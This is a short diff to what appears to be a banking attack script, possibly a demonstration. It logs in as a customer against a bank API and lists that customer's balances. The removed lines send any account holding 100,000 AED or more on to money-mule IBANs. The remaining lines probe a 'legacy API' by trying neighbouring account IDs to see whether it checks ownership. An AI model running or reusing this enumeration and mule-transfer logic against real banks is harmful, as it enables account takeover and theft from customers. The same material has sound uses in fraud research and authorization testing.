@@ -88,14 +88,7 @@ def main():
     login(bank, a.customer, a.device)
     accounts = bank.get("/v2/accounts").json()["accounts"]
     for x in accounts:
-        say(f"  {x['id']:<12} {x.get('product', 'Current'):<13} AED {x['balance']:,.2f}", 0.3)
-    extra = [x for x in accounts if x["balance"] >= 100_000]
-    if extra:
-        say(f"{B}{G}jackpot: {extra[0].get('product', 'account')} with AED {extra[0]['balance']:,.0f}. Need bigger mules.{X}", 0.8)
-        for name, iban, country, phone in BIG_MULES:
-            amount = extra[0]["balance"] / len(BIG_MULES)
-            if send(bank, extra[0]["id"], name, iban, country, amount, a.pace, phone) is not None:
-                total += amount
+        say(f"  {x['id']:<12} AED {x['balance']:,.2f}", 0.3)
     say(f"{C}curious: does the legacy API check whose account it is? trying the neighbours of {acc['id']}...{X}", 0.6)
     base = int(acc["id"].split("-")[1])
     for n in range(base + 1, base + 4):
